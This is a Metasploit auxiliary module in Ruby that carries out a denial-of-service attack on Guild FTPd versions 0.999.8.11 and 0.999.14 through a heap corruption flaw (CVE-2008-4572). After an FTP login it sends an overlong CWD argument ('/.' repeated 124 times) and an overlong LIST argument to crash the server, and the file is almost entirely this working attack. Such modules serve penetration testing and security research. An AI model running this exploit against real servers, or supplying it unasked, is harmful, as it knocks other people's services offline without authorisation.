##
# This module requires Metasploit: http//metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'msf/core'

class Metasploit3 < Msf::Auxiliary

  include Msf::Exploit::Remote::Ftp
  include Msf::Auxiliary::Dos

  def initialize(info = {})
    super(update_info(info,
      'Name'           => 'Guild FTPd 0.999.8.11/0.999.14 Heap Corruption',
      'Description'    => %q{
        Guild FTPd 0.999.8.11 and 0.999.14 are vulnerable
        to heap corruption.  You need to have a valid login
        so you can run CWD and LIST.
      },
      'Author'         => 'kris katterjohn',
      'License'        => MSF_LICENSE,
      'References'     =>
        [
          [ 'CVE', '2008-4572' ],
          [ 'OSVDB', '49045' ],
          [ 'EDB', '6738']
        ],
      'DisclosureDate' => 'Oct 12 2008'))

    # They're required
    register_options([
      OptString.new('FTPUSER', [ true, 'Valid FTP username', 'anonymous' ]),
      OptString.new('FTPPASS', [ true, 'Valid FTP password for username', 'anonymous' ])
    ])
  end

  def run
    return unless connect_login

    print_status("Sending commands...")

    # We want to try to wait for responses to these
    resp = send_cmd(['CWD', '/.' * 124])
    resp = send_cmd(['LIST', 'X' * 100])

    disconnect
  end
end
